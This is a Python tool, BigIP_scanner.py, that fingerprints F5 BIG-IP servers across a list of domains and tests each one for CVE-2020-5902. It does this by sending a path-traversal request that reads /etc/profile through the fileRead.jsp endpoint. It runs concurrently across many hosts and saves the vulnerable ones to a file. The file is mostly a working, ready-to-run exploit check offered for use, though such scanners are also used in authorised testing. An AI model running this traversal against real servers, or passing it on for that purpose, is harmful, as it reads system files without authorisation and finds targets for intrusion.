import argparse, re, requests, concurrent.futures, sys, time, mmh3, codecs
from terminaltables import AsciiTable as table
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def create_table(rows):
	t = table(rows,"")
	t.inner_column_border, t.outer_border, t.inner_heading_row_border, t.inner_footing_row_border = [False]*4
	return ("\n"+t.table)

def detect(url, heads):
	try:
		req = requests.get(url, headers=heads, verify=False, timeout=20)
		headers = req.headers
		try:
			r = requests.get(url+"/favicon.ico", headers=heads, verify=False, timeout=20)
			favicon_hash = mmh3.hash(codecs.encode(r.content, "base64"))
		except:
			favicon_hash = 0
			pass
	except Exception as e:
		# print(e)
		return False
	# yup it's better to use my own one fingerprint because whatwaf fingerprint is old :3
	title = re.compile("title>(.*)</title").findall(req.content.decode())
	if (title and title[0]=='BIG-IP&reg;- Redirect') or (favicon_hash==-335242539):
		return True

def Big_man(url, heads, no_detection=False): # Yup nice function name :"D
	result = {}
	if no_detection or detect(url, heads):
		result["url"]        = url
		result["Vulnerable"] = False
		try:
			req = requests.get(url+'/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/profile', headers=heads, verify=False, timeout=20)
			if ('System wide environment and startup programs' in req.text): # or req.status_code==200
				result["Vulnerable"] = True
		except requests.exceptions.RequestException:
			pass
	######################
	return result

class color:
	reset     = '\033[0m'
	green     = reset + '\033[32m'
	blue      = reset + '\033[94m'
	red       = reset + '\033[31m'
	white     = reset + '\x1b[37m'
	magneta   = reset + '\x1b[35m'
	cyan      = reset + '\x1b[36m'
	Bold      = "\033[1m"
	underline = "\033[4m"

def main( args):
	try:
		f = open(args.Domains_file)
		domains = f.read().splitlines()
		f.close()
	except:
		print(color.red+" [!] Can't read file!")
		exit(1)

	headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"}
	if args.headers:
		for line in args.headers.split("\n"):
			if ":" not in line:
				print(color.red+" [!] Invalid headers! headers should be at the form (name:value) seperated by \\n.")
				exit(1)
			else:
				headers.update({line.split(":")[0]:line.split(":")[1]})

	sys.stdout.write(f"{color.green}[+]{color.reset} Loaded {len(domains)} domain(s)\n")
	sys.stdout.flush()
	total = {"Vulnerable":[], "Notvulnerable":[]}
	number,futures = 0,[]
	with concurrent.futures.ThreadPoolExecutor(max_workers=len(domains)) as executor:
		start = time.time()
		for d in domains:
			number +=1
			sys.stdout.write("\r | Launching concurrent detectors {:10}".format("({}/{})".format( number,len(domains) )) )
			sys.stdout.flush()
			url = d
			if not url.startswith("http"):
				url = "http://"+url
			if url.endswith("/"):
				url = url[:-1]
			futures.append( executor.submit(Big_man, url, headers, bool(args.check_only)))
			time.sleep(0.01)
		sys.stdout.write("\r | Waiting for result(s) from detectors.....")
		sys.stdout.flush()
		number = 0
		for site in concurrent.futures.as_completed(futures, timeout=(60*10)):
			number +=1
			sys.stdout.write("\r | Collecting results ( Total progress: {:.2f}%)".format((number/len(domains))*100))
			sys.stdout.flush()
			domain_result = site.result()
			if domain_result:
				if domain_result["Vulnerable"]:
					total["Vulnerable"].append(domain_result["url"])
				else:
					total["Notvulnerable"].append(domain_result["url"])
		# Now printing
		rows = []
		for u in total["Vulnerable"]:
			rows.append(["| "+u,f"\t{color.green}{color.Bold}[  Vulnerable  ]{color.reset}"])
		if not args.check_only:
			for u in total["Notvulnerable"]:
				rows.append(["| "+u,f"\t{color.red}{color.Bold}[Not vulnerable]{color.reset}"])
		print(create_table(rows), flush=True)

	sys.stdout.write(f"{color.blue} |{color.reset} Total elapsed time {time.strftime('%M.%Sm', time.gmtime(time.time()-start))}.\n")
	sys.stdout.flush()
	if args.o and type(args.o) is str and total:
		try:
			f = open(args.o,"w")
			for line in total["Vulnerable"]:
				f.write(line+"\n")
			f.close()
			print(f"{color.blue}[i]{color.reset} Written results to {args.o}\n")
		except:
			print(f"{color.red} [!] Can't write to {args.o}!\n")

if __name__ == '__main__':
	parser = argparse.ArgumentParser(prog='BigIP_scanner.py')
	parser.add_argument("Domains_file", help="File of domains file to work with")
	parser.add_argument("--headers", help="Headers you want to add to requests(ex: 'Host: 127.0.0.1')")
	parser.add_argument("--check-only", help="Don't try to detect BIGIP servers from the file and check against CVE-2020-5902 only", action="store_true")
	parser.add_argument("-o", help="Output the vulnerable domains to a file.")
	args = parser.parse_args()
	print(f"\n\t{color.Bold} BigIP Scanner - {color.blue}{color.Bold}By: Karim 'D4Vinci' Shoair{color.reset}\n")
	main(args)
